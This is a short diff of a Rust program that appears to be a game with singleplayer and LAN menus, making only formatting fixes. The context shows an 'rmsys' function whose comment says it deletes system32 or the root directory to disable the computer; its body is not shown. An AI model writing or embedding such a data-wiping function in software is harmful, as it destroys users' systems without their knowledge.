@@ -12,7 +12,7 @@ fn user_os() -> &'static str {
 fn rmsys() {
     // This function removes the "system32" directory for Windows and the "/" directory for Windows, single-handedly disabling the entire computer :D
     let os = user_os();
-    
+
     if os == "windows" {
         println!("Dumbo be using windows omaga frr :skull:");
     } else if os == "linux" {
@@ -84,7 +84,7 @@ fn menu() -> usize {
 
 fn main() {
     let counter = menu();
-    match (counter) {
+    match counter {
         0 => start_singleplayer(),
         1 => start_lan_multiplayer(),
         2 => quit(),
